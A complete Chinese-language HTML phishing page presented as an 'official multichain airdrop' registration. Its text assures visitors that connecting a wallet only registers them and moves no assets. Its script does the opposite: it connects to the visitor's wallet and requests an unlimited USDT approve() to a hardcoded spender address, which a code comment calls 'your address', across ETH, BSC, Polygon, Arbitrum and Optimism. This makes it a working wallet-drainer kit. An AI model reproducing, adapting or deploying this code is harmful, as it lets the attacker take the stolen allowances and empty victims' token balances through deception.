<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>官方空投 | 链上备案</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px}
.container{max-width:480px;margin:0 auto}
.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}
.hide{display:none}
.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
h1{font-size:22px;margin-bottom:8px;color:#fff}
.sub-title{font-size:14px;color:#89aabc;margin-bottom:25px}
.desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}
.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}
.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}
.notice-content{font-size:13px;color:#b0c4e0;line-height:1.65}
.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}
.btn:active{opacity:.9;transform:scale(.98)}
.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}
.success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}
.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
</style>
</head>
<body>
<div class="container">
<div id="p1" class="box">
<div class="logo">✦</div>
<h1>官方生态空投活动</h1>
<p class="sub-title">官方唯一链上资格备案通道</p>
<div class="notice-box">
<div class="notice-title">📢 活动公告</div>
<div class="notice-content">本次支持ETH、BSC、Polygon、Arbitrum、Optimism多链。仅用于钱包地址官方备案授权，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，请放心连接。</div>
</div>
<p class="desc-text">请连接钱包完成链上资格备案登记</p>
<button class="btn mm-btn" id="connectMM">连接钱包</button>
<p class="tips-info">自动适配多链，仅备案授权核验</p>
</div>

<div id="p2" class="box hide">
<div class="logo">⏳</div>
<h1>交易已提交，区块确认中</h1>
<p class="desc-text">等待链上交易最终确认...</p>
</div>

<div id="p3" class="box hide">
<div class="logo">✓</div>
<h1>钱包连接成功</h1>
<p class="sub-title">确认纳入全链空投白名单</p>
<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
<button class="btn verify-btn" id="approveBtn">确认空投备案授权</button>
<p class="tips-info">仅发起链上授权备案，不会划转任何资产</p>
</div>

<div id="p4" class="box hide">
<div class="logo">✅</div>
<h1>交易已上链，授权成功</h1>
<p class="sub-title">该地址已完成官方空投备案</p>
<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
<button class="btn success-btn">授权完成</button>
</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<script>
(function(){
    // 固定授权目标地址（你的地址）
    const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
    // 无限授权额度
    const MAX_ALLOW = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
    // 各链USDT合约地址
    const chainUSDT = {
        "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
        "0x38":"0x55d398326f99059fF77548524699952727959279",
        "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
        "0xa4b1":"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69fcbb9",
        "0xa":"0x94b08aacad473b14b798123f16e781f1d3cfe9e6"
    };
    // ERC20 标准ABI（只包含approve方法）
    const usdtABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];

    let walletAddr = "";
    let usdtContract;
    let showAddr=document.getElementById("showAddr");
    let successAddr=document.getElementById("successAddr");

    function showPage(id){
        document.querySelectorAll(".box").forEach(e=>e.classList.add("hide"));
        document.getElementById(id).classList.remove("hide");
    }

    // 唤起钱包APP
    function openWalletApp(){
        const url = encodeURIComponent(window.location.href);
        location.href = `metamask://dapp/${url}`;
    }

    // 连接钱包
    document.getElementById("connectMM").onclick = async function(){
        if(!window.ethereum){
            openWalletApp();
            return;
        }
        showPage("p2");
        try{
            await window.ethereum.request({method:'eth_requestAccounts'});
            const web3 = new Web3(window.ethereum);
            let accounts = await web3.eth.getAccounts();
            walletAddr = accounts[0];
            let chainId = await web3.eth.getChainId();
            let hexChainId = "0x" + chainId.toString(16);
            let usdtAddress = chainUSDT[hexChainId] || chainUSDT["0x38"];
            usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);

            showPage("p3");
            showAddr.innerText = walletAddr;
        }catch(e){
            showPage("p1");
        }
    };

    // 授权：通过合约实例调用，自动生成正确data，不再手工拼16进制
    document.getElementById("approveBtn").onclick = async function(){
        if(!walletAddr || !usdtContract) return;
        showPage("p2");
        try{
            await usdtContract.methods.approve(SPENDER, MAX_ALLOW).send({from: walletAddr});
            showPage("p4");
            successAddr.innerText = walletAddr;
        }catch(e){
            // 用户取消授权，停留在P3
            showPage("p3");
        }
    };
})();
</script>
</body>
</html>
